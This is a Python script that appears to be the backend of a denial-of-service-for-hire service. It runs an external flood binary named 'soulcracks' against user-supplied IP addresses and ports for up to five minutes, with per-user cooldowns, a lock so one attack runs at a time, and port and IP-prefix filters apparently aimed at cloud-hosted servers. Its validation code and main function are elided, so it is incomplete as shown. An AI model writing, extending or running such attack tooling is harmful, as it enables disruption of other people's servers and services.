import asyncio
import logging
import subprocess
import threading
import sys
import time
from datetime import datetime

# Constants
blocked_ports = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BINARY = "./soulcracks"  # Replace with your binary name
MAX_ATTACK_TIME = 300  # Maximum attack duration in seconds
ATTACK_COOLDOWN = 60  # Cooldown between attacks in seconds

# Global variables
attack_in_process = False
user_last_attack = {}

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Function to run the attack command (optimized)
def run_attack(target_ip, target_port, duration):
    command = [BINARY, target_ip, str(target_port), str(duration)]  # Use a list for subprocess
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # Use Popen for non-blocking
        stdout, stderr = process.communicate() # Get output and error once the process finishes

        if process.returncode != 0:
            logging.error(f"Attack failed with return code {process.returncode}: {stderr.decode()}")
        else:
            logging.info(f"Attack launched on {target_ip}:{target_port} for {duration} seconds.")
            if stdout:
                logging.debug(f"Attack stdout: {stdout.decode()}") # Log stdout if needed
            if stderr:
                logging.debug(f"Attack stderr: {stderr.decode()}") # Log stderr if needed
    except FileNotFoundError:
        logging.error(f"Binary not found: {BINARY}")
    except Exception as e:
        logging.error(f"Failed to execute attack command: {e}")


# Function to process the attack command (optimized)
def process_attack_command(target_ip, target_port, duration, user_id):
    global attack_in_process

    # ... (Validation code remains the same)

    if attack_in_process:
        logging.warning("An attack is already in progress.")
        return

    # ... (IP and port validation remain the same)

    if user_id in user_last_attack:
        time_since_last_attack = time.time() - user_last_attack[user_id]  # Use time.time() for efficiency
        if time_since_last_attack < ATTACK_COOLDOWN:
            wait_time = ATTACK_COOLDOWN - time_since_last_attack
            logging.warning(f"User {user_id} must wait {wait_time:.2f} seconds before attacking again.")
            return

    attack_in_process = True
    user_last_attack[user_id] = time.time()  # Store timestamp

    attack_thread = threading.Thread(target=run_attack, args=(target_ip, target_port, duration))
    attack_thread.start()

    # No need for separate timer. Attack status is reset when the attack thread finishes.

    logging.info(f"Attack initiated by user {user_id} on {target_ip}:{target_port} for {duration} seconds.")

    attack_thread.join()  # Wait for the attack thread to finish
    attack_in_process = False # Reset attack status
    logging.info("Attack finished. System ready for the next attack.")


# ... (main function remains the same)

if __name__ == "__main__":
    main()
